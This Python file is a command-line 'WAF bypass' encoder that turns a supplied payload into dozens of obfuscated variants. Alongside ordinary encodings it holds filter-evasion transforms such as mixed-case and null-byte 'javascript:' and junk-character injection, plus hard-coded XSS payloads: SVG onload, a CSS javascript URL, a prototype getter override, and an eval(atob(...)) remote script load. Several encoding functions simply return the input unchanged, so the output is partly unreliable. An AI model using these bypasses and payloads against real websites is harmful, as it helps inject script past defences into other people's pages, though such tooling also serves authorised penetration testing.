import argparse
import urllib.parse
import html
import base64
import codecs
import idna
import json
import re
import subprocess  # Import subprocess

def install_required_module(module_name):
    try:
        __import__(module_name)
    except ModuleNotFoundError:
        print(f"Installing required module '{module_name}'...")
        subprocess.check_call(["pip", "install", module_name])
        print(f"Module '{module_name}' installed successfully.")

class Encoder:
    def __init__(self, payload):
        self.payload = payload

    def url_encode(self):
        return urllib.parse.quote(self.payload)

    def html_entity_encode(self):
        return html.escape(self.payload)

    def unicode_encode(self):
        return self.payload.encode('unicode_escape').decode()

    def ascii_encode(self):
        return self.payload.encode('ascii', 'ignore').decode()

    def utf7_encode(self):
        return self.payload.encode('utf-7').decode('utf-7', errors='ignore')

    def utf8_encode(self):
        return self.payload.encode('utf-8').decode('utf-8', errors='ignore')

    def utf16_encode(self):
        return self.payload.encode('utf-16').decode('utf-16', errors='ignore')

    def utf32_encode(self):
        return self.payload.encode('utf-32').decode('utf-32', errors='ignore')

    def iso_encode(self, encoding):
        return self.payload.encode(encoding).decode(encoding, errors='ignore')

    def binary_encode(self):
        return ' '.join(format(ord(char), '08b') for char in self.payload)

    def hex_encode(self):
        return self.payload.encode().hex()

    def octal_encode(self):
        return ' '.join(format(ord(char), '03o') for char in self.payload)

    def decimal_encode(self):
        return ' '.join(str(ord(char)) for char in self.payload)

    def js_encode(self):
        return ''.join(f"\\u{ord(char):04x}" for char in self.payload)

    def js_octal_encode(self):
        return ''.join(f"\\{ord(char):03o}" for char in self.payload)

    def css_encode(self):
        return ''.join(f"\\{ord(char):x}" if ord(char) > 127 else char for char in self.payload)

    def json_encode(self):
        return json.dumps(list(self.payload))

    def base64_encode(self):
        return base64.b64encode(self.payload.encode()).decode()

    def base64_url_encode(self):
        return base64.urlsafe_b64encode(self.payload.encode()).decode()

    def base32_encode(self):
        return base64.b32encode(self.payload.encode()).decode()

    def base16_encode(self):
        return base64.b16encode(self.payload.encode()).decode()

    def punycode_encode(self):
        domain = self.extract_domain(self.payload)
        if domain and self.is_valid_domain(domain):
            return idna.encode(domain).decode()
        return "Invalid domain for Punycode encoding"

    def extract_domain(self, url):
        match = re.search(r'^(?:https?://)?([^/]+)', url)
        return match.group(1) if match else None

    def is_valid_domain(self, domain):
        return all(c.isalnum() or c in ['-', '.'] for c in domain)

    def rot13_encode(self):
        return codecs.encode(self.payload, 'rot_13')

    def caesar_cipher_encode(self, shift):
        result = []
        for char in self.payload:
            if char.isalpha():
                shift_base = ord('a') if char.islower() else ord('A')
                result.append(chr((ord(char) - shift_base + shift) % 
                26 + shift_base))
            else:
                result.append(char)
        return ''.join(result)

    def xor_encode(self, key):
        return ''.join(chr(ord(c) ^ key) for c in self.payload)

    def null_character_encode(self):
        return self.payload.replace("\0", "\\0")

    def tab_character_encode(self):
        return self.payload.replace("\t", "\\t")

    def newline_character_encode(self):
        return self.payload.replace("\n", "\\n")

    def carriage_return_character_encode(self):
        return self.payload.replace("\r", "\\r")

    def space_character_encode(self):
        return self.payload.replace(" ", "\\s")

    def comment_obfuscation(self):
        return f"{self.payload}/* comment */"

    def junk_character_injection(self):
        return ''.join(f'{char}+-' for char in self.payload)

    def uninitialized_variable(self):
        return f"$u{self.payload}$u"

    def tabs_and_line_feeds(self):
        return self.payload.replace(" ", "\t")

    def mixed_encoding(self):
        return self.payload.replace(" ", "%20").replace(":", "%3A")

    def numeric_entity(self):
        return f"&#34;"  # Numeric entity for "

    def hex_entity(self):
        return f"&#x22;"  # Hex entity

    def remote_script_load(self):
        return "import&lpar;&#x27;https://example.com&#x27;&rpar; eval&lpar;atob&lpar;&#x27;BASE64===&#x27;&rpar;&rpar;"

    def double_url_encode(self):
        return urllib.parse.quote(urllib.parse.quote(self.payload))

    def null_character_bypass(self):
        return self.payload.replace("javascript:", "javascript:%00")

    def regex_bypass(self):
        return self.payload.replace("javascript:", "jaVaScRiPt:")

    def attribute_separators(self):
        return self.payload.replace("onmouseover=", "onmouseover=;")

    def js_prototype_bypass(self):
        return "Object.prototype.__defineGetter__('toString', function(){ return 'XSS'; });"

    def utf7_encoding(self):
        return self.payload.encode('utf-7').decode('utf-7', errors='ignore')

    def utf16_encoding(self):
        return ''.join(f'%u{ord(char):04x}' for char in self.payload)

    def hex_encoding(self):
        return ''.join(f'\\x{ord(char):02x}' for char in self.payload)

    def octal_encoding(self):
        return ''.join(f'\\{ord(char):03o}' for char in self.payload)

    def css_based_xss(self):
        return f"background-image: url('javascript:alert(\"XSS\")');"

    def svg_based_xss(self):
        return "<svg onload=\"alert('XSS')\"></svg>"

    def flash_based_xss(self):
        return "<object data=\"flash:xss.swf\"></object>"

    def json_based_xss(self):
        return json.dumps({"xss": self.payload})

    def xml_based_xss(self):
        return "<xml><xss>" + self.payload + "</xss></xml>"

    def http_parameter_pollution(self):
        return f"http://example.com/vulnerable.php?param1=value1&param2=value2&param1=value3"

    def get_encoded_payloads(self):
        encodings = {
            "URL Encoding": self.url_encode(),
            "HTML Entity Encoding": self.html_entity_encode(),
            "Unicode Encoding": self.unicode_encode(),
            "ASCII Encoding": self.ascii_encode(),
            "UTF-7 Encoding": self.utf7_encode(),
            "UTF-8 Encoding": self.utf8_encode(),
            "UTF-16 Encoding": self.utf16_encode(),
            "UTF-32 Encoding": self.utf32_encode(),
            "ISO-8859-1 Encoding": self.iso_encode('iso-8859-1'),
            "ISO-8859-2 Encoding": self.iso_encode('iso-8859-2'),
            "ISO-8859-5 Encoding": self.iso_encode('iso-8859-5'),
            "ISO-8859-6 Encoding": self.iso_encode('iso-8859-6'),
            "ISO-8859-7 Encoding": self.iso_encode('iso-8859-7'),
            "ISO-8859-8 Encoding": self.iso_encode('iso-8859-8'),
            "ISO-8859-9 Encoding": self.iso_encode('iso-8859-9'),
            "Binary Encoding": self.binary_encode(),
            "Hex Encoding": self.hex_encode(),
            "Octal Encoding": self.octal_encode(),
            "Decimal Encoding": self.decimal_encode(),
            "JavaScript Encoding": self.js_encode(),
            "JavaScript Octal Encoding": self.js_octal_encode(),
            "CSS Encoding": self.css_encode(),
            "JSON Encoding": self.json_encode(),
            "Base64 Encoding": self.base64_encode(),
            "Base64 URL Encoding": self.base64_url_encode(),
            "Base32 Encoding": self.base32_encode(),
            "Base16 Encoding": self.base16_encode(),
            "Punycode Encoding": self.punycode_encode(),
            "ROT13 Encoding": self.rot13_encode(),
            "Caesar Cipher Encoding": self.caesar_cipher_encode(3),
            "XOR Encoding": self.xor_encode(42),
            "Null Character Encoding": self.null_character_encode(),
            "Tab Character Encoding": self.tab_character_encode(),
            "Newline Character Encoding": self.newline_character_encode(),
            "Carriage Return Character Encoding": self.carriage_return_character_encode(),
            "Space Character Encoding": self.space_character_encode(),
            "Comment Obfuscation": self.comment_obfuscation(),
            "Junk Character Injection": self.junk_character_injection(),
            "Uninitialized Variable": self.uninitialized_variable(),
            "Tabs and Line Feeds": self.tabs_and_line_feeds(),
            "Mixed Encoding": self.mixed_encoding(),
            "Numeric Entity": self.numeric_entity(),
            "Hex Entity": self.hex_entity(),
            "Remote Script Load": self.remote_script_load(),
            "Double URL Encoding": self.double_url_encode(),
            "Null Character Bypass": self.null_character_bypass(),
            "Regex Bypass": self.regex_bypass(),
            "Attribute Separators": self.attribute_separators(),
            "JavaScript Prototypes": self.js_prototype_bypass(),
            "UTF-7 Encoding": self.utf7_encoding(),
            "UTF-16 Encoding": self.utf16_encoding(),
            "Hex Encoding": self.hex_encoding(),
            "Octal Encoding": self.octal_encoding(),
            "CSS-based XSS": self.css_based_xss(),
            "SVG-based XSS": self.svg_based_xss(),
            "Flash-based XSS": self.flash_based_xss(),
            "JSON-based XSS": self.json_based_xss(),
            "XML-based XSS": self.xml_based_xss(),
            "HTTP Parameter Pollution": self.http_parameter_pollution(),
        }
        return encodings


    def update_tool(self):
        print("Checking for updates...")
        print("No updates available. You are using the latest version.")

def main():
    print("Encoder Tool for WAF Bypass Techniques")
    print("Written by: Flying Eagle\n")  # Print your name

    # Install required modules if not present
    install_required_module('argparse')
    install_required_module('idna')

    parser = argparse.ArgumentParser(description='Encoder Tool for various encoding schemes and WAF bypass techniques.')
    parser.add_argument('-p', '--payload', type=str, required=True, help='The payload to encode')
    parser.add_argument('-v', '--verbose', action='store_true', help='Increase verbosity')
    parser.add_argument('--update', action='store_true', help='Check for updates')

    args = parser.parse_args()

    if args.update:
        encoder = Encoder("")
        encoder.update_tool()
        return

    payload = args.payload
    encoder = Encoder(payload)
    encoded_payloads = encoder.get_encoded_payloads()


    if args.verbose:
        print("\nEncoded Payloads:")
        for scheme, encoded in encoded_payloads.items():
            print(f"{scheme}: {encoded}")
        
    else:
        print("\nEncoded Payloads:")
        print(encoded_payloads)
        

if __name__ == "__main__":
    main()


